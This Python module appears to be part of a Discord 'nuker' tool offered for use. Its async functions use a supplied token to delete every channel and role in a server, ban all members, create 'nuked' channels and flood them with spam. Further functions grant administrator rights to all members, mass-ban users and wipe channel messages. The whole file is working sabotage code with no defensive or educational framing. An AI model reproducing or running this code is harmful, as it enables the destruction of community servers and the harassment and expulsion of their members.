from .core import DiscordSession
from . import utils
import asyncio

async def fullnuke(token: str, guild_id: int, spam_message: str, number: int, is_bot: bool = False):
    async with DiscordSession(token, is_bot) as api:
        guild = await api.get(f"/guilds/{guild_id}")
        if not guild:
            print("Guild not found.")
            return
        self_id = (await api.get("/users/@me"))['id']
        
        channels = await utils.get_guild_channels(api, guild_id)
        delete_tasks = [utils.delete_channel(api, ch['id']) for ch in channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        print(f"Deleted {len(channels)} channels.")
        
        roles = await utils.get_guild_roles(api, guild_id)
        for role in roles:
            if role['name'] == '@everyone' or role.get('managed', False):
                continue
            await utils.delete_role(api, guild_id, role['id'])
        print("Roles deleted.")
        
        members = await utils.get_guild_members(api, guild_id)
        ban_tasks = []
        for m in members:
            if m['user']['id'] != self_id:
                ban_tasks.append(utils.ban_member(api, guild_id, m['user']['id'], reason="Nuked"))
        await asyncio.gather(*ban_tasks, return_exceptions=True)
        print(f"Banned {len(ban_tasks)} members.")
        
        new_channels = []
        for i in range(number):
            ch = await utils.create_channel(api, guild_id, f"nuked-{i}")
            if ch:
                new_channels.append(ch['id'])
        
        spam_tasks = []
        for ch_id in new_channels:
            for _ in range(number):
                spam_tasks.append(utils.send_message(api, ch_id, spam_message))
        await asyncio.gather(*spam_tasks, return_exceptions=True)
        print(f"Sent {len(spam_tasks)} messages.")

async def rolenuke(token: str, guild_id: int, is_bot: bool = False):
    async with DiscordSession(token, is_bot) as api:
        roles = await utils.get_guild_roles(api, guild_id)
        tasks = []
        for role in roles:
            if role['name'] != '@everyone' and not role.get('managed', False):
                tasks.append(utils.delete_role(api, guild_id, role['id']))
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"Deleted {len(tasks)} roles.")

async def channelnuke(token: str, guild_id: int, is_bot: bool = False):
    async with DiscordSession(token, is_bot) as api:
        channels = await utils.get_guild_channels(api, guild_id)
        tasks = [utils.delete_channel(api, ch['id']) for ch in channels]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"Deleted {len(channels)} channels.")

async def adminnuke(token: str, guild_id: int, target_role_name: str = "ADMIN", is_bot: bool = False):
    async with DiscordSession(token, is_bot) as api:
        admin_perms = 0x8
        role_data = {
            "name": target_role_name,
            "permissions": str(admin_perms),
            "color": 0xFF0000,
            "hoist": True,
            "mentionable": True
        }
        role = await api.post(f"/guilds/{guild_id}/roles", json=role_data)
        if not role:
            print("Failed to create admin role.")
            return
        role_id = role['id']
        
        members = await utils.get_guild_members(api, guild_id)
        tasks = []
        for m in members:
            tasks.append(api.put(f"/guilds/{guild_id}/members/{m['user']['id']}/roles/{role_id}", json={}))
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"Admin role assigned to {len(tasks)} members.")

async def massban(token: str, guild_id: int, user_ids: list = None, is_bot: bool = False):
    async with DiscordSession(token, is_bot) as api:
        self_id = (await api.get("/users/@me"))['id']
        if user_ids is None:
            members = await utils.get_guild_members(api, guild_id)
            user_ids = [m['user']['id'] for m in members if m['user']['id'] != self_id]
        tasks = [utils.ban_member(api, guild_id, uid) for uid in user_ids]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"Banned {len(tasks)} users.")

async def msgnuke(token: str, channel_id: int, amount: int = 100, is_bot: bool = False):
    async with DiscordSession(token, is_bot) as api:
        messages = await utils.get_channel_messages(api, channel_id, limit=amount)
        tasks = [utils.delete_message(api, channel_id, msg['id']) for msg in messages]
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"Deleted {len(tasks)} messages.")
